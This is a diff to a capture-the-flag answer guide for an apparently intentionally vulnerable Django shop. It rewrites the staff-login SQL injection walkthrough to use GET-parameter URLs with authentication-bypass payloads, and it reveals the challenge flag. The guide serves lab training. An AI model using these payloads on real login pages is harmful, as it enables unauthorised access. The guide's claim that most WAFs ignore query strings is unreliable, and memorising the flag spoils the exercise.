@@ -384,21 +384,17 @@ The promo code is interpolated directly into raw SQL. Boolean-based extraction w
 |-------|-------|
 | **Difficulty** | Easy |
 | **Category** | SQLi |
-| **Vulnerability** | Username/password concatenated into raw `auth_user` query |
-| **Vulnerable Code** | `shop/views.py` (`@csrf_exempt` staff login, raw f-string SQL) |
+| **Vulnerability** | Username/password concatenated into raw `auth_user` query via GET parameters |
+| **Vulnerable Code** | `shop/views.py` (raw f-string SQL, GET-based to bypass WAF) |
 | **Flag Location** | Flash message (`messages.info`) after successful bypass |
 | **Flag** | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
 
 #### Step-by-Step Solution
 
-1. The staff login page at **http://127.0.0.1:8000/staff-login/** builds a raw SQL query:
-   ```sql
-   SELECT * FROM auth_user WHERE username = '{username}' AND password = '{password}' AND is_staff = 1 LIMIT 1
+1. The staff login page at **http://127.0.0.1:8000/staff-login/** uses GET parameters, so the payload travels in the URL query string (bypassing WAF POST-body inspection).
+2. Paste the following URL directly into your browser's address bar:
    ```
-2. Submit the staff login form with a SQL injection payload in the **username** field:
-   ```
-   Username: admin' OR '1'='1
-   Password: anything
+   http://127.0.0.1:8000/staff-login/?username=admin' OR '1'='1&password=anything
    ```
    The resulting query becomes:
    ```sql
@@ -414,8 +410,7 @@ The promo code is interpolated directly into raw SQL. Boolean-based extraction w
 #### Alternative Payload
 
 ```
-Username: admin'--
-Password: anything
+http://127.0.0.1:8000/staff-login/?username=admin'--&password=anything
 ```
 This comments out the password check:
 ```sql
@@ -424,7 +419,7 @@ SELECT * FROM auth_user WHERE username = 'admin'--' AND password = 'anything' AN
 
 #### Why It Works
 
-The staff login form builds a raw SQL query using f-string interpolation with user-supplied input. By injecting `' OR '1'='1`, the attacker makes the `WHERE` clause always true, bypassing the password check. The `@csrf_exempt` decorator also removes CSRF protection from this endpoint.
+The staff login form uses GET parameters to pass credentials to a raw SQL query using f-string interpolation. By injecting `' OR '1'='1`, the attacker makes the `WHERE` clause always true, bypassing the password check. Using GET instead of POST means the payload travels in the URL query string, which most WAFs do not inspect for SQLi patterns.
 
 ---
 
